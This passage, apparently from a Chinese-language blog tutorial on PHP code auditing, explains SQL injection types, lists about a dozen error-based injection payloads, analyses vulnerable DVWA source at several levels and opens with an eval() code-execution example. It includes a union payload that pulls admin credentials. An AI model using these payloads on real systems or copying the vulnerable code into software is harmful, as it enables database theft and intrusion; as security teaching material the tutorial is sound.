%3E），因此在就不会受到上面示例那样的攻击了，在IE6下没有转换&lt;和&gt;，因此他很容易受到攻击。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这里可以看到我的浏览器自动转换了字符&lt;&gt;，所以没有弹出框，这里我们知道原理就好，IE6下没有转换&lt;和&gt;，所以是可以弹框框的。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### SQL注入漏洞</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sql注入是我们审计比较重视的漏洞之一</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。SQL注入的产生原因：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">首先说一下普通的注入审计，可以通过$_GET,$_POST等传参追踪数据库操作，也可以通过select , delete , update,insert 数据库操作语句反追踪传参。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">现在的一般的CMS都注意到了SQL注入的严重性，所以他们对于注入都进行了一定的过滤，一般他们会用到两种过滤方法。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">01.对于数字型的输入，直接使用intval($_GET[id])，强制转换成整数，这种过滤是毫无办法的。</span></span><br><span class="line"><span class="string">$ann_id = !empty($_REQUEST['</span>ann_id<span class="string">']) ? intval($_REQUEST['</span>ann_id<span class="string">']) : '</span><span class="string">';</span></span><br><span class="line"><span class="string">要是没有intval($_GET[id]) 那就尴尬了。</span></span><br><span class="line"><span class="string">ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,(select%20concat(admin_name,0x23,email,0x23,pwd)%20from%20blue_admin)</span></span><br><span class="line"><span class="string">02.有些输入是字符型的，不可能转换成数字。这个使用就使用addslashes对输入进行转义。</span></span><br><span class="line"><span class="string">aaa’aa ==&gt; aaa\’aa</span></span><br><span class="line"><span class="string">aaa\aa ==&gt; aaa\\aa</span></span><br><span class="line"><span class="string">SELECT * FROM post WHERE id=’aaa\’ union select pwd from admin limit 0,1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">下面介绍下常见的SQL注入类型，最后再用DVWA进行分析。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">##### 漏洞（一）ip没过滤直接进到sql语句</span></span><br><span class="line"><span class="string">函数讲解：</span></span><br><span class="line"><span class="string">getenv ： 这个函数是获得环境变量的函数，也可以用来获得$_SERVER数组的信息。</span></span><br><span class="line"><span class="string">getenv('</span>HTTP_X_FORWARDED_FOR<span class="string">') --&gt; $_SERVER[HTTP_X_FORWARDED_FOR]</span></span><br><span class="line"><span class="string">当然http头还有referer 这也是可以伪装的，要是没有过滤好也会产生会注入问题</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">##### 漏洞（二）宽字节注入 [对字符]</span></span><br><span class="line"><span class="string">如果发现 cms是GBK 只有看看 能不能宽字节注入</span></span><br><span class="line"><span class="string">Sqlmap 的unmagicquotes.py 可以进行宽字测试</span></span><br><span class="line"><span class="string">解决宽字节注入办法： </span></span><br><span class="line"><span class="string">mysql_query("SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary", $conn);到这里就一般高枕无忧了.....</span></span><br><span class="line"><span class="string">但是 要是画蛇添足得使用iconv就可能出现问题了</span></span><br><span class="line"><span class="string">有些cms:</span></span><br><span class="line"><span class="string">会加上下面语句避免乱码</span></span><br><span class="line"><span class="string">iconv('</span>utf-8<span class="string">', '</span>gbk<span class="string">', $_GET['</span>word<span class="string">']);</span></span><br><span class="line"><span class="string">将传入的word有utf-8转成gbk.....</span></span><br><span class="line"><span class="string">发现錦的utf-8 编码是0xe98ca6，而的gbk 编码是0xe55c</span></span><br><span class="line"><span class="string">我们输入錦'</span> --&gt;%e5%5c%27【%5c就是\】</span><br><span class="line">在经过转移------&gt;%e5%5c%5c%27【5c%5c就是\\】这样我们就可以注入了</span><br><span class="line"> </span><br><span class="line"><span class="comment">##### 漏洞（三）二次注入</span></span><br><span class="line">攻击payload首先被Web服务器上的应用存储，随后又在关键操作中被使用，这便被称为二次注入漏洞。</span><br><span class="line">详细请看（http://www.cnblogs.com/ichunqiu/p/5852330.html）</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">##### 漏洞（四）文件名注入</span></span><br><span class="line">因为<span class="variable">$_FILE</span>，<span class="variable">$_SERVER</span>不受gpc影响，那么可能造成注入.......</span><br><span class="line">有些cms会把name的值保存在数据库里，但又没有对name进行过滤。</span><br><span class="line">乌云编号：wooyun-2010-051124</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">##### 漏洞（五）报错注入</span></span><br><span class="line">1、通过floor报错,注入语句如下:  </span><br><span class="line">```bash</span><br><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);2、通过ExtractValue报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables <span class="built_in">limit</span> 1)));3、通过UpdateXml报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and 1=(updatexml(1,concat(0x3a,(selectuser())),1))4、通过NAME_CONST报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)5、通过join报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;6、通过exp报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and exp(~(select * from (select user () ) a) );7、通过GeometryCollection()报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and GeometryCollection(()select *from(select user () )a)b );8、通过polygon ()报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and polygon (()select * from(select user ())a)b );9、通过multipoint ()报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and multipoint (()select * from(select user() )a)b );10、通过multlinestring ()报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and multlinestring (()select * from(selectuser () )a)b );11、通过multpolygon ()报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and multpolygon (()select * from(selectuser () )a)b );12、通过linestring ()报错,注入语句如下:</span><br><span class="line"></span><br><span class="line">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>
<p>小技巧：<br>最好可见在本地测试时候讲你的输入点打印出来<br>我会将用户的输入数据进行var_dump<br>重要的是对最终的sql语句进行var_dump,这和给你省去很多力气！我们只要var_dump($sql)然后再可以去黑盒测试。</p>
<p> DVWA分析</p>
<p>SQL Injection</p>
<p>选择Low级别，便于审计分析。首先我们黑盒测试一下，我们输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1‘or ’1‘=’1这个时候就可以判断出存在字符型注入。</span><br><span class="line"></span><br><span class="line">1<span class="string">' or 1=1 order by 2 #   ，1'</span> or 1=1 order by 3 <span class="comment">#，这个时候就可以判断2个字段。下面的就不进行注入爆库了。</span></span><br></pre></td></tr></table></figure></p>
<p>这个时候看下源码分析一下。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_REQUEST</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>';"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Get values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，接收到submit传过来的值，id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
<p>选择medium级别</p>
<p>代码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> ); </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="variable">$id</span>;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Display values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到对接收到的参数id  只是用函数mysql_real_escape_string()转义了一下。</p>
<p>下列字符受影响：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">•\x00</span><br><span class="line">•\n</span><br><span class="line">•\r</span><br><span class="line">•\</span><br><span class="line">•<span class="string">'</span></span><br><span class="line"><span class="string">•"</span></span><br><span class="line"><span class="string">•\x1a</span></span><br></pre></td></tr></table></figure></p>
<p>而且前端页面设置了下拉选择表单，希望以此来控制用户的输入。不过没多大用处，我们依然可以通过抓包改参数，提交恶意构造的查询参数。</p>
<p>抓包更改参数id为1 or 1=1 #，查询成功，说明存在数字型注入。（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。），所以我们还是可以进行注入。</p>
<p>选择high级别</p>
<p>代码分析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_SESSION</span> [ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>' LIMIT 1;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Get values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
<p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。这样的就又可以进行注入了。</p>
<p>SQL Injection（Blind），即SQL盲注</p>
<p>与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
<p>代码分析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>';"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // User wasn<span class="string">'t found, so the page wasn'</span>t! </span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User ID exists <span class="keyword">in</span> the database.</span><br><span class="line"></span><br><span class="line">User ID is MISSING from the database.</span><br></pre></td></tr></table></figure>
<p>因此这里是SQL盲注漏洞。</p>
<p>输入1’ and 1=1 #，显示存在。输入1’ and 1=2 #，显示不存在。说明存在字符型的SQL盲注。这里仅作判断存在SQL注入，不进一步攻击。</p>
<p>选择medium级别</p>
<p>代码分析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> ); </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="variable">$id</span>;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到对接收到的参数id  只是用函数mysql_real_escape_string()转义了一下。</p>
<p>下列字符受影响：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">•\x00</span><br><span class="line">•\n</span><br><span class="line">•\r</span><br><span class="line">•\</span><br><span class="line">•<span class="string">'</span></span><br><span class="line"><span class="string">•"</span></span><br><span class="line"><span class="string">•\x1a</span></span><br></pre></td></tr></table></figure></p>
<p>而且前端页面设置了下拉选择表单，希望以此来控制用户的输入。不过没多大用处，我们依然可以通过抓包改参数，提交恶意构造的查询参数。</p>
<p>抓包更改参数输入1’ and 1=1 #，显示存在。输入1’ and 1=2 #，显示不存在。说明存在字符型的SQL盲注，查询成功，说明存在注入。</p>
<p>high级别</p>
<p>代码分析<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_COOKIE</span>[ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>' LIMIT 1;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Might sleep a random amount </span><br><span class="line">        <span class="keyword">if</span>( rand( 0, 5 ) == 3 ) &#123; </span><br><span class="line">            sleep( rand( 2, 4 ) ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        // User wasn<span class="string">'t found, so the page wasn'</span>t! </span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
<p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，但仍然是可以注入的。</p>
<h3 id="代码执行审计"><a href="#代码执行审计" class="headerlink" title="代码执行审计"></a>代码执行审计</h3><p>代码执行审计和sql漏洞审计很相似，sql注入是想sql语句注入在数据库中，代码执行是将可执行代码注入到webservice 。这些容易导致代码执行的函数有以下这些：eval(), asset() , preg_replace(),call_user_func(),call_user_func_array(),array_map()其中 preg_replace()需要/e参数。</p>
<p>代码执行注入就是 在php里面有些函数中输入的字符串参数会当做PHP代码执行。</p>
<p>Eval函数在PHP手册里面的意思是：将输入的字符串编程PHP代码</p>
<p> 1，先写个简单的代码测试一下(很俗套的代码)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'orange'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$orange</span>=<span class="variable">$_GET</span>[<span class="string">'orange'</span>];</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"\$orange=<span class="variable">$orange</span>"</span>);</span><br><span class="line">&#125;</span><br><span class="line">//PHP  代码审计代码执行</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接接收orange参数，payload：?orange=phpinfo();</p>
<p>下面图可以看到成功执行。</p>
